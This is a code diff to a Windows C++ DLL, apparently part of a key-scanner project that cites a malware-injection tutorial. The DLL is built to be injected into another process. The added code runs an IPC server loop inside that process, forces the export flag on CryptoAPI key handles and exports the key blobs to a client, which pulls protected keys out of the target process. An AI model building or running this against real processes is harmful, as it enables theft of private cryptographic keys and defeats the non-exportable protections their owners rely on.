@@ -6,21 +6,24 @@ https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
 
 #include <windows.h>
 #include <wincrypt.h>
+#include <iostream>
 #include <fstream>
 #include <string>
 #pragma comment (lib, "user32.lib")
 
 #include "program_result.h"
-using ErrorResult = error_handling::ErrorResult;
-using OkResult = error_handling::OkResult;
-
 #include "cryptoapi.h"
 #include "injection/interproc_coms.h"
 using namespace custom_ipc;
+using namespace error_handling;
+using namespace std;
 
 DWORD timeout_millis = 20000;
 
 int StartMailSlot();
+void ServerLoop(CustomServerV2& server);
+ProgramResult ForceKeyBlobExport(HCRYPTKEY key_handle, DWORD blob_type, vector<BYTE>& buffer);
+ProgramResult ExportKeyCommand(Request request, CustomServerV2& server);
 
 extern "C" __declspec(dllexport) void StartMailSlotExporter(LPVOID lpParam) {
   printf("Started mailslot\n");
@@ -28,6 +31,12 @@ extern "C" __declspec(dllexport) void StartMailSlotExporter(LPVOID lpParam) {
 }
 
 extern "C" __declspec(dllexport) void StartServer(LPVOID lpParam) {
+  auto server = custom_ipc::CustomServerV2();
+  if (server.StartServer().IsOk()) {
+    ServerLoop(server);
+  } else ShowGUIMessage("Failed to start remote server");
+
+  /*
   // StartMailSlot();
   NamedPipeServer server = NamedPipeServer(kPipeName, timeout_millis);
   // ShowGUIMessage("Creating server");
@@ -41,13 +50,13 @@ extern "C" __declspec(dllexport) void StartServer(LPVOID lpParam) {
   } // else ShowGUIMessage("Did not enter server loop due to previous error");
   // ShowGUIMessage("Closing server");
   server.CloseServer();
+  */
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
   switch (nReason) {
   case DLL_PROCESS_ATTACH:
-    // ShowGUIMessage("DLL loaded in process");
-    printf("PID: %u\n", GetCurrentProcessId());
+    custom_ipc::ShowGUIMessage("DLL loaded in process");
     break;
   case DLL_PROCESS_DETACH:
     break;
@@ -57,6 +66,28 @@ BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
     break;
   }
   return TRUE;
+}
+
+void ServerLoop(CustomServerV2& server) {
+  while (true) {
+    Request request;
+    if (server.GetRequest(request).IsErr()) continue;
+
+    switch (request.command) {
+      case command::kEndServer:
+        ShowGUIMessage("Shutting down server");
+        server.Close();
+        return;
+      
+      case command::kExportKey:
+        cout << ExportKeyCommand(request, server).GetResultInformation() << endl;
+        break;
+      
+      default:
+        ShowGUIMessage("Invalid command");
+        break;
+    }
+  }
 }
 
 #include <wincrypt.h>
@@ -137,4 +168,56 @@ int StartMailSlot() {
 
   CloseHandle(hMailslot);
   return 0;
+}
+
+ProgramResult ExportKeyCommand(Request request, CustomServerV2& server) {
+  auto blob = vector<BYTE>();
+  custom_ipc::Response response;
+
+  KeyDataMessage* key_data = (KeyDataMessage*) request.data.data();
+  auto export_status = ForceKeyBlobExport(key_data->key_handle, key_data->blob_type, blob);
+
+  if (export_status.IsErr()) {
+    response = {
+      result::kError, // code
+      vector<BYTE>() // data (empty)
+    };
+  
+  } else {
+    response = {
+      result::kOk, // code
+      blob // data
+    };
+  }
+
+  return server.SendResponse(response);
+}
+
+ProgramResult ForceKeyBlobExport(HCRYPTKEY key_handle, DWORD blob_type, vector<BYTE>& buffer) {
+  key_scanner::cryptoapi::ForceExportBit(key_handle);
+  printf("Exporting key: 0x%p\n", (void*) key_handle);
+
+  DWORD data_len;
+  BOOL res = CryptExportKey(
+    key_handle, NULL,
+    blob_type, 0,
+    NULL,
+    &data_len
+  );
+
+  if (!res) return ErrorResult("Error exporting the key: " + GetLastErrorAsString());
+  
+  auto blob_buffer = vector<BYTE>(data_len, 0);
+  res = CryptExportKey(
+    key_handle, NULL,
+    blob_type, 0,
+    blob_buffer.data(),
+    &data_len
+  );
+
+  if (!res) return ErrorResult("Error exporting the key: " + GetLastErrorAsString());
+  // If the final data is shorter
+  if (blob_buffer.size() != data_len) blob_buffer.resize(data_len);
+
+  return OkResult("Blob exported to buffer");
 }
